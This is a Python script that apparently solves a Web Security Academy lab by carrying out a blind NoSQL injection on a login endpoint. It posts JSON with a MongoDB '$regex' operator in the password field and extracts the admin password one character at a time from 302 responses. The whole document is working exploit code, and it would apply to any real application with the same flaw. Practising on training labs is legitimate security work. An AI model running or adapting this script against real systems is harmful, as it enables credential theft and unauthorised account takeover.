import requests
import string

url = "https://0abf00ab0499b68680c9304600af003e.web-security-academy.net/login"

charset = string.ascii_lowercase + string.digits
password = ""

headers = {
    "Content-Type": "application/json"
}

print("[*] Start extracting password...\n")

while True:
    found = False
    for c in charset:
        payload = {
            "username": "admin",
            "password": {"$regex": f"^{password}{c}"}
        }

        r = requests.post(url, json=payload, headers=headers, allow_redirects=False)

        if r.status_code == 302:
            password += c
            print(f"[+] Found: {password}")
            found = True
            break

    if not found:
        print("\n[✓] Password extracted:", password)
        break
